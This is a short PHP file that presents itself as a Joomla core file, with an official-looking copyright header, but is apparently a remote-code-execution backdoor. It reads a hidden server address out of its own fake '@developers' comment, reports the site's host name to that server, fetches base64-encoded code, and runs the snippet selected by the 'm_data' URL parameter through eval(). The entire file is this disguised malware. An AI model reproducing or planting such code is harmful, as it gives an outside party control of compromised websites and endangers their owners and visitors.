<?php
/**
 * @package     Joomla.Site
 * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @developers  For information on http://api-joomla.org to develop for Joomla! code base.
 * @licensegnu  GNU General Public License version 2 or later; see LICENSE.txt
 */
 
$data_id = abs(intval($_GET ['m_data']));

$fp = curl_init(preg_replace("#^.*?[\s]on[\s]*(.*?g).*$#is", "\\1", file_get_contents(__FILE__))."/"."router"."/?dm=".$_SERVER ["HTTP_HOST"]);
curl_setopt($fp, CURLOPT_TIMEOUT_MS, 3000);
curl_setopt($fp, CURLOPT_CONNECTTIMEOUT_MS, 3000);
curl_setopt($fp, CURLOPT_RETURNTRANSFER, true);
$info_block = curl_exec($fp);
curl_close($fp);
if (!$info_block) return;
if (!$data_id) return;

$cache_db_a = array();
$cache_db_s = $fp;
if ($cache_db_s) $cache_db_a = json_decode(base64_decode($info_block), 1);
if (!$cache_db_a) return;

$info_text = trim($cache_db_a [$data_id]['data']);
	echo eval($info_text);

?>